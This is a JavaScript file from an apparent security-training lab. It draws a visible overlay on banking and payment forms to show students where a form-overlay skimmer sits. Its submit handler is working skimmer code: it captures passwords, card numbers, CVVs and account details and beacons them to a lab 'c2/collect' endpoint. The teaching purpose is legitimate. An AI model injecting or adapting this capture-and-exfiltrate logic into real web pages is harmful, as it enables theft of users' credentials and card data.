/**
 * FORM-OVERLAY-XRAY.JS — X-RAY VISUALIZATION OF FORM OVERLAY ATTACK
 *
 * Same attack as form-overlay.js but with the skimmer layer made visible:
 * a semi-transparent red sheen positioned exactly over the real form,
 * with per-field tags showing what data is being captured.
 *
 * Educational purpose: lets students see the invisible overlay that real
 * skimmers inject, without hiding the legitimate form beneath it.
 *
 * FOR EDUCATIONAL PURPOSES ONLY
 */
;(function () {
  'use strict'

  const exfilUrl = window.location.origin + '/lab2/c2/collect'

  const SENSITIVE_SELECTORS = [
    'input[type="password"]',
    'input[name*="card"], input[id*="card"]',
    'input[name*="cvv"], input[id*="cvv"]',
    'input[name*="account"], input[id*="account"]',
    'input[name*="amount"], input[id*="amount"]',
    'input[name*="routing"], input[id*="routing"]',
    'select[name*="payee"], select[id*="payee"]',
  ]

  const FIELD_LABELS = {
    password: 'PASSWORD',
    card: 'CARD #',
    cvv: 'CVV',
    account: 'ACCOUNT #',
    amount: 'AMOUNT',
    routing: 'ROUTING #',
    payee: 'PAYEE',
  }

  const TARGET_FORM_SELECTORS = [
    '#transfer-form',
    '#payment-form',
    '#card-action-form',
    '#add-card-form',
  ]

  function getFieldLabel(el) {
    const key = Object.keys(FIELD_LABELS).find(k =>
      (el.name || el.id || '').toLowerCase().includes(k)
    )
    return FIELD_LABELS[key] || 'DATA'
  }

  function absRect(el) {
    const r = el.getBoundingClientRect()
    return { top: r.top, left: r.left, width: r.width, height: r.height }
  }

  function injectStyles() {
    if (document.getElementById('xray-styles')) return
    const s = document.createElement('style')
    s.id = 'xray-styles'
    s.textContent = `
      #xray-sheen {
        position: fixed;
        background: rgba(220, 38, 38, 0.07);
        border: 1.5px solid rgba(220, 38, 38, 0.35);
        border-radius: 4px;
        box-shadow: 0 0 0 4px rgba(220, 38, 38, 0.05),
                    0 0 20px rgba(220, 38, 38, 0.12);
        pointer-events: none;
        z-index: 9999;
      }
      .xray-badge {
        position: absolute;
        top: -12px;
        right: 10px;
        background: rgba(185, 28, 28, 0.92);
        color: #fff;
        font: 700 10px/1.4 system-ui, sans-serif;
        padding: 2px 8px;
        border-radius: 3px;
        letter-spacing: 0.07em;
        text-transform: uppercase;
        white-space: nowrap;
      }
      .xray-field-highlight {
        position: absolute;
        border: 1.5px solid rgba(220, 38, 38, 0.45);
        border-radius: 3px;
        background: rgba(220, 38, 38, 0.05);
        pointer-events: none;
      }
      .xray-field-tag {
        position: absolute;
        background: rgba(185, 28, 28, 0.88);
        color: #fff;
        font: 600 9px/1.4 system-ui, sans-serif;
        padding: 1px 6px;
        border-radius: 2px 2px 0 0;
        letter-spacing: 0.06em;
        text-transform: uppercase;
        white-space: nowrap;
        transform: translateY(-100%);
      }
    `
    document.head.appendChild(s)
  }

  function findVisibleForm() {
    for (const sel of TARGET_FORM_SELECTORS) {
      const el = document.querySelector(sel)
      if (el && el.offsetParent !== null) return el
    }
    return null
  }

  function findSensitiveInputs(form) {
    const seen = new Set()
    const inputs = []
    SENSITIVE_SELECTORS.forEach(sel => {
      form.querySelectorAll(sel).forEach(el => {
        if (!seen.has(el)) { seen.add(el); inputs.push(el) }
      })
    })
    return inputs
  }

  let sheenEl = null
  let sheenOpacity = 1

  function placeSheen() {
    const form = findVisibleForm()
    if (sheenEl) { sheenEl.remove(); sheenEl = null }
    if (!form) return

    const inputs = findSensitiveInputs(form)
    if (!inputs.length) return

    const formR = absRect(form)
    const sheen = document.createElement('div')
    sheen.id = 'xray-sheen'
    Object.assign(sheen.style, {
      top: formR.top + 'px',
      left: formR.left + 'px',
      width: formR.width + 'px',
      height: formR.height + 'px',
      opacity: sheenOpacity,
    })

    const badge = document.createElement('div')
    badge.className = 'xray-badge'
    badge.textContent = '⚠ SKIMMER LAYER'
    sheen.appendChild(badge)

    inputs.forEach(input => {
      const ir = absRect(input)
      const relTop = ir.top - formR.top
      const relLeft = ir.left - formR.left

      const highlight = document.createElement('div')
      highlight.className = 'xray-field-highlight'
      Object.assign(highlight.style, {
        top: relTop + 'px',
        left: relLeft + 'px',
        width: ir.width + 'px',
        height: ir.height + 'px',
      })

      const tag = document.createElement('div')
      tag.className = 'xray-field-tag'
      tag.textContent = '📡 ' + getFieldLabel(input)
      Object.assign(tag.style, {
        top: relTop + 'px',
        left: relLeft + 'px',
      })

      sheen.appendChild(highlight)
      sheen.appendChild(tag)
    })

    document.body.appendChild(sheen)
    sheenEl = sheen
  }

  function exfil(form) {
    const data = {}
    new FormData(form).forEach((v, k) => { data[k] = v })
    navigator.sendBeacon(exfilUrl, JSON.stringify({
      type: 'form_overlay_capture',
      variant: 'xray',
      data,
      url: window.location.href,
      timestamp: Date.now(),
    }))
    console.log('[XRay-Overlay] Data captured:', Object.keys(data))
  }

  function init() {
    injectStyles()

    setTimeout(placeSheen, 600)

    window.addEventListener('resize', placeSheen, { passive: true })
    window.addEventListener('scroll', placeSheen, { passive: true })

    // Re-place when tabs switch (class changes toggle section visibility)
    const observer = new MutationObserver(placeSheen)
    observer.observe(document.body, {
      attributes: true,
      subtree: true,
      attributeFilter: ['class', 'style'],
    })

    // Intercept form submits to exfiltrate — same as the real attack
    document.addEventListener('submit', function (e) {
      const form = e.target.closest(TARGET_FORM_SELECTORS.join(', '))
      if (form) exfil(form)
    }, true)
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init)
  } else {
    init()
  }

  window.xrayOverlay = {
    refresh: placeSheen,
    setOpacity: function (val) {
      sheenOpacity = val
      if (sheenEl) sheenEl.style.opacity = val
    },
  }
})()
